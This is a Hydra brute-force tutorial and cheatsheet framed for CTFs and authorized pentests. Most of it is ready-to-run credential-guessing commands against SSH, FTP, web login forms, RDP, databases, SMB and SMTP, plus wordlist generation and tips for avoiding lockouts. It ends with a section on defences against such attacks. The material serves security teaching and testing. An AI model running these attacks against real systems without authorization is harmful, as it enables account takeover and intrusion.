# Hydra – Complete Notes & Tutorial

> **Disclaimer:** This material is strictly for **ethical hacking, CTFs (Capture the Flag), and authorized penetration testing**. Using Hydra on systems without explicit permission is illegal and unethical.

---

## Table of Contents

1. [What is Hydra?](#what-is-hydra)
2. [How Brute Force Attacks Work](#how-brute-force-attacks-work)
3. [Supported Protocols](#supported-protocols)
4. [Installation](#installation)
5. [Core Concepts](#core-concepts)
6. [Common Hydra Flags](#common-hydra-flags)
7. [Attacking SSH](#attacking-ssh)
8. [Attacking FTP](#attacking-ftp)
9. [Attacking Web Forms (POST)](#attacking-web-forms-post)
10. [Attacking Web Forms (GET)](#attacking-web-forms-get)
11. [Attacking RDP](#attacking-rdp)
12. [Attacking MySQL / Databases](#attacking-mysql--databases)
13. [Wordlists – The Fuel of Brute Forcing](#wordlists--the-fuel-of-brute-forcing)
14. [Real-World Scenarios](#real-world-scenarios)
15. [Hydra vs. Other Tools](#hydra-vs-other-tools)
16. [Defense – How to Protect Against Hydra](#defense--how-to-protect-against-hydra)
17. [Quick Reference Cheatsheet](#quick-reference-cheatsheet)

---

## 1. What is Hydra?

**Hydra** (also known as `thc-hydra`) is an open-source, fast, and flexible **online password brute-forcing tool**. It was developed by **The Hacker's Choice (THC)** group.

### Key Characteristics

| Feature | Detail |
|---|---|
| Type | Online brute-force / credential stuffing |
| Speed | Highly parallelized (multi-threaded) |
| Protocols | 50+ supported |
| Platform | Linux, macOS, Windows (via WSL) |
| License | AGPL v3 |

### Analogy

> Think of Hydra as a **locksmith robot** that tries thousands of keys on a lock (login system) at high speed. It doesn't break the lock — it finds the correct key from a big keyring (wordlist).

### Online vs. Offline Cracking

| Type | Tool Examples | How It Works |
|---|---|---|
| **Online** | Hydra, Medusa | Sends actual login attempts to a live service |
| **Offline** | Hashcat, John the Ripper | Cracks password hashes without touching the target |

Hydra is an **online** tool — it needs the target service to be running.

---

## 2. How Brute Force Attacks Work

### Types of Password Attacks

```
Dictionary Attack     → Tries words from a pre-built wordlist
Brute Force Attack    → Tries every possible combination (a, b, ..., aa, ab, ...)
Credential Stuffing   → Uses leaked username:password pairs from data breaches
Password Spraying     → Tries one common password across many accounts
```

### Hydra's Approach

1. Takes a **username** (or list of usernames)
2. Takes a **password wordlist**
3. Sends login requests to the target one-by-one (or in parallel threads)
4. Reports back which combination **succeeded**

### Visual Flow

```
[Wordlist: passwords.txt]          [Target: SSH on 192.168.1.10]
  admin                ──────────► Try: root / admin        ✗ Fail
  password123          ──────────► Try: root / password123  ✗ Fail
  toor                 ──────────► Try: root / toor         ✓ SUCCESS!
  ...
```

---

## 3. Supported Protocols

Hydra can attack **50+ protocols**. The most commonly used in ethical hacking:

### Network Services
- `ssh` – Secure Shell
- `ftp` – File Transfer Protocol
- `telnet` – Legacy remote shell
- `rdp` – Remote Desktop Protocol (Windows)
- `vnc` – Virtual Network Computing

### Web Protocols
- `http-get` – HTTP Basic Auth (GET)
- `http-post-form` – Login forms using POST
- `https-get` / `https-post-form` – HTTPS variants
- `http-proxy` – Proxy authentication

### Database Services
- `mysql` – MySQL database
- `postgres` – PostgreSQL
- `mssql` – Microsoft SQL Server
- `mongodb` – MongoDB
- `oracle` – Oracle DB

### Email & Messaging
- `smtp` – Email sending
- `pop3` – Email retrieval
- `imap` – Email access
- `xmpp` – Chat protocol

### Others
- `smb` – Windows file sharing
- `ldap` – Directory services (Active Directory)
- `snmp` – Network device management
- `sip` – VoIP
- `socks5` – Proxy protocol

---

## 4. Installation

### Kali Linux / Parrot OS (pre-installed)

```bash
hydra --version
```

### Ubuntu / Debian

```bash
sudo apt update
sudo apt install hydra -y
```

### Build from Source

```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
make install
```

### Verify Installation

```bash
hydra -h        # Show help
hydra --version # Show version
```

---

## 5. Core Concepts

### Username Options

| Flag | Meaning | Example |
|---|---|---|
| `-l` | Single username | `-l admin` |
| `-L` | Username list file | `-L users.txt` |

### Password Options

| Flag | Meaning | Example |
|---|---|---|
| `-p` | Single password | `-p password123` |
| `-P` | Password list file | `-P rockyou.txt` |

### Output Options

| Flag | Meaning |
|---|---|
| `-V` | Verbose – show every attempt |
| `-v` | Less verbose |
| `-o output.txt` | Save results to file |

### Performance Options

| Flag | Meaning | Default |
|---|---|---|
| `-t N` | Number of threads | 16 |
| `-w N` | Wait time (seconds) between tries | 32 |
| `-W N` | Wait between connects per thread | 0 |

### Targeting

```bash
# Single IP
hydra -l admin -P pass.txt 192.168.1.10 ssh

# With protocol as URL
hydra -l admin -P pass.txt ssh://192.168.1.10

# Custom port
hydra -l admin -P pass.txt -s 2222 192.168.1.10 ssh
```

---

## 6. Common Hydra Flags

```
-l LOGIN        : single login name
-L FILE         : load logins from FILE
-p PASS         : single password
-P FILE         : load passwords from FILE
-C FILE         : colon-separated "login:pass" format (e.g., admin:password123)
-M FILE         : list of servers to attack
-t TASKS        : run TASKS number of connects in parallel per target (default: 16)
-U              : service module usage details
-h              : more command line options (COMPLETE HELP)
-V              : verbose mode / show login+pass for each attempt
-v              : verbose mode
-d              : debug mode
-w TIME         : defines the max wait time in seconds for responses (default: 32)
-W TIME         : defines a wait time between each connection (default: 0)
-f              : exit when a login/pass pair is found (-M: -f per host, -F global)
-F              : exit when a login/pass pair is found (-M: -F global)
-s PORT         : if the service is on a different default port, define it here
-R              : restore a previous aborted/crashed session
-I              : ignore an existing restore file (don't wait 10 seconds)
-S              : perform an SSL connect
-O              : use old SSL v2 and v3
-q              : do not print messages about connection errors
-u              : loop around users, not passwords (effective! implied with -x)
-o FILE         : write found login/password pairs to FILE instead of stdout
-b FORMAT       : specify the format for the -o FILE: text(default), json, jsonv1
-6              : prefer IPv6 addresses
-e ns           : try "n" null password, "s" login as pass
```

---

## 7. Attacking SSH

### Basic SSH Attack

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.10 -t 4 ssh
```

**Breakdown:**
- `-l root` → try username `root`
- `-P rockyou.txt` → use the rockyou wordlist
- `192.168.1.10` → target IP address
- `-t 4` → 4 parallel threads (SSH rate-limits heavily, keep this low)
- `ssh` → protocol to attack

### SSH with Custom Port

```bash
hydra -l ubuntu -P passwords.txt -s 2222 192.168.1.10 ssh
```

### SSH with Multiple Users

```bash
hydra -L users.txt -P passwords.txt 192.168.1.10 -t 4 ssh -V
```

### SSH with User:Pass Combo List

```bash
# File format: admin:password123
hydra -C combo_list.txt 192.168.1.10 ssh
```

### Real-World SSH Scenario

> **Scenario:** During a penetration test, you find port 22 open on a server. The sysadmin mentioned they use "common passwords." You run:

```bash
hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt 10.10.10.50 -t 4 ssh -V
```

> Hydra discovers the password is `letmein123`. This demonstrates why SSH password auth should be **disabled** in favor of SSH key authentication.

---

## 8. Attacking FTP

### Basic FTP Attack

```bash
hydra -l user -P passlist.txt ftp://192.168.1.10
```

### FTP with Verbose Output

```bash
hydra -l anonymous -P passwords.txt 192.168.1.10 ftp -V
```

### FTP on Custom Port

```bash
hydra -l ftpuser -P rockyou.txt -s 2121 192.168.1.10 ftp
```

### Real-World FTP Scenario

> **Scenario:** A company is running an old FTP server (port 21) for file transfers. They never changed default credentials.

```bash
hydra -L default_users.txt -P default_passwords.txt 10.0.0.15 ftp -V -f
```

> `-f` exits as soon as the first valid pair is found — useful in time-sensitive pentests.

---

## 9. Attacking Web Forms (POST)

This is one of Hydra's most powerful use cases — **brute-forcing login forms** on websites.

### Syntax

```bash
hydra -l <username> -P <wordlist> <IP> http-post-form "<path>:<body>:<fail_string>"
```

### The Three-Part Form String

```
"<path>:<login_credentials>:<invalid_response>"
```

| Part | Description | Example |
|---|---|---|
| `<path>` | URL path of the login page | `/login`, `/admin/login.php` |
| `<login_credentials>` | POST body with `^USER^` and `^PASS^` placeholders | `username=^USER^&password=^PASS^` |
| `<invalid_response>` | Text that appears in the response when login **fails** | `F=incorrect`, `F=Invalid credentials` |

### Basic Example

```bash
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form \
  "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### HTTPS Login Form

```bash
hydra -l admin -P passwords.txt 10.10.10.10 https-post-form \
  "/login:email=^USER^&password=^PASS^:F=Wrong password" -V
```

### Success String (Alternative to Fail String)

Instead of matching a fail string (`F=`), you can match a **success string** (`S=`):

```bash
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Welcome" -V
```

### Login on Non-Default Port

```bash
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Login failed" -s 8080 -V
```

### Real-World Web Form Scenario

> **Scenario:** TryHackMe / HackTheBox machine with a web login at `http://10.10.x.x`. You open browser DevTools → Network tab → submit the form → observe:
> - **URL:** `POST /login`
> - **Body:** `username=test&password=test`
> - **Failed response contains:** `Your username or password is incorrect.`

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
```

---

## 10. Attacking Web Forms (GET)

Some older applications use GET-based authentication (less common today).

```bash
hydra -l admin -P passwords.txt 192.168.1.10 http-get /protected-page
```

### HTTP Basic Auth

```bash
hydra -l admin -P rockyou.txt http-get://192.168.1.10/admin/
```

---

## 11. Attacking RDP

Remote Desktop Protocol is common on Windows servers.

```bash
hydra -l administrator -P passwords.txt 192.168.1.10 rdp
```

### With Verbose + Specific Thread Count

```bash
hydra -L users.txt -P rockyou.txt 192.168.1.10 rdp -t 4 -V
```

>  **Note:** RDP has built-in lockout policies. Use low thread counts (`-t 2` or `-t 4`) to avoid triggering account lockouts.

---

## 12. Attacking MySQL / Databases

### MySQL

```bash
hydra -l root -P passwords.txt 192.168.1.10 mysql
```

### PostgreSQL

```bash
hydra -l postgres -P rockyou.txt 192.168.1.10 postgres
```

### Real-World Database Scenario

> **Scenario:** A misconfigured MySQL server is exposed to the internet on port 3306. The DBA never changed the default root password.

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.5.20 mysql -V
```

---

## 13. Wordlists – The Fuel of Brute Forcing

The success of Hydra depends almost entirely on the **quality of your wordlist**.

### Common Wordlists (Kali Linux)

| Wordlist | Location | Size | Use Case |
|---|---|---|---|
| `rockyou.txt` | `/usr/share/wordlists/rockyou.txt` | 14M+ passwords | General purpose |
| `fasttrack.txt` | `/usr/share/wordlists/fasttrack.txt` | Small | Quick common passwords |
| SecLists | `/usr/share/seclists/` | Huge collection | Web, usernames, passwords |

### Unzip rockyou.txt (Kali)

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Create a Custom Wordlist with CeWL

```bash
# Scrape a website to generate a custom wordlist
cewl http://target-company.com -d 3 -m 5 -w custom_words.txt
```

### Generate Wordlists with Crunch

```bash
# Generate all 4-character lowercase passwords
crunch 4 4 abcdefghijklmnopqrstuvwxyz -o 4char.txt

# Generate passwords with pattern
crunch 8 8 -t admin@@@ -o admin_pass.txt
```

### Username Lists

```bash
# Common default usernames file
cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

---

## 14. Real-World Scenarios

### Scenario 1: CTF SSH Login (TryHackMe Style)

```bash
# Situation: You have a username "molly" from enumeration
# Task: Find her SSH password

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.21.34 -t 4 ssh
```

**Expected Output:**
```
[22][ssh] host: 10.10.21.34   login: molly   password: butterfly
```

### Scenario 2: WordPress Admin Login

```bash
# WordPress login endpoint: /wp-login.php
# Failed string: "The password you entered for the username"

hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered" -V
```

### Scenario 3: DVWA (Damn Vulnerable Web App) Brute Force

```bash
# DVWA uses a cookie for session; pass it with header
hydra -l admin -P rockyou.txt 10.10.10.10 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=YOUR_SESSION_ID"
```

### Scenario 4: Corporate Pentest – SMB

```bash
# Testing Windows share authentication
hydra -L users.txt -P common_passwords.txt 192.168.10.5 smb -V
```

### Scenario 5: Email Server (SMTP)

```bash
hydra -l ceo@company.com -P rockyou.txt smtp://mail.company.com
```

---

## 15. Hydra vs. Other Tools

| Feature | Hydra | Medusa | Ncrack |
|---|---|---|---|
| Speed | Fast | Fast | Fast |
| Protocols | 50+ | 20+ | 11 |
| Ease of Use | Medium | Medium | Easy |
| Web Forms | Yes | Limited | No |
| Active Development | Yes | Slower | Yes |
| Best For | General purpose | Parallel speed | Network services |

### When to Use What

- **Hydra** → Best for web forms, most versatile
- **Medusa** → Faster for mass parallel attacks
- **Ncrack** → Simple network service attacks
- **Burp Suite Intruder** → Web attacks with full HTTP control (more features for web)

---

## 16. Defense – How to Protect Against Hydra

Understanding the attack helps you **build better defenses**.

### 1. Account Lockout Policies

```
After 5 failed attempts → lock account for 15 minutes
```

Implementation in Linux PAM (`/etc/pam.d/sshd`):
```
auth required pam_tally2.so deny=5 onerr=fail unlock_time=900
```

### 2. Rate Limiting

Using `fail2ban` to block IPs after repeated failures:

```bash
# Install fail2ban
sudo apt install fail2ban

# Configure SSH protection
# /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
findtime = 300
bantime = 3600
```

### 3. Disable Password Authentication (SSH)

```bash
# In /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes
```

> This completely defeats Hydra for SSH — no password means nothing to brute-force.

### 4. Use Multi-Factor Authentication (MFA)

Even if the password is cracked, the attacker needs the second factor.

### 5. CAPTCHA on Web Login Forms

Hydra cannot solve CAPTCHAs — implementing them on login pages stops automated attacks.

### 6. Web Application Firewall (WAF)

WAFs detect and block rapid, repeated login requests from a single IP.

### 7. Use Strong, Unique Passwords

- Minimum 12 characters
- Mix of uppercase, lowercase, numbers, symbols
- No dictionary words
- Unique per service

### 8. Monitor Logs

```bash
# Check failed SSH attempts
sudo cat /var/log/auth.log | grep "Failed password"

# Watch in real time
sudo tail -f /var/log/auth.log
```

---

## 17. Quick Reference Cheatsheet

### Basic Syntax

```bash
hydra [options] target protocol
```

### Most Common Commands

```bash
# SSH
hydra -l root -P rockyou.txt 10.10.10.10 -t 4 ssh

# FTP
hydra -l user -P passlist.txt ftp://10.10.10.10

# HTTP POST Form
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect" -V

# HTTP POST Form on custom port
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect" -s 8080 -V

# HTTPS POST Form
hydra -l admin -P rockyou.txt 10.10.10.10 https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Wrong" -V

# RDP
hydra -l administrator -P passwords.txt 10.10.10.10 rdp -t 4

# MySQL
hydra -l root -P rockyou.txt 10.10.10.10 mysql

# Multiple usernames + passwords
hydra -L users.txt -P rockyou.txt 10.10.10.10 ssh -V

# Combo list (user:pass format)
hydra -C combo.txt 10.10.10.10 ftp

# Save results to file
hydra -l admin -P rockyou.txt 10.10.10.10 ssh -o results.txt

# Exit on first success
hydra -l admin -P rockyou.txt 10.10.10.10 ssh -f

# Try empty password and login=pass
hydra -l admin -P rockyou.txt 10.10.10.10 ssh -e ns

# Resume a stopped session
hydra -R
```

### Placeholder Reference for Web Forms

| Placeholder | Replaced By |
|---|---|
| `^USER^` | Current username being tried |
| `^PASS^` | Current password being tried |

### Fail/Success String Reference

| String | Meaning |
|---|---|
| `F=text` | Login FAILED if response contains "text" |
| `S=text` | Login SUCCEEDED if response contains "text" |

---

##  Further Learning

- **TryHackMe** – Hydra room: https://tryhackme.com/room/hydra
- **Official GitHub**: https://github.com/vanhauser-thc/thc-hydra
- **SecLists (Wordlists)**: https://github.com/danielmiessler/SecLists
- **OWASP Brute Force Prevention**: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks

---
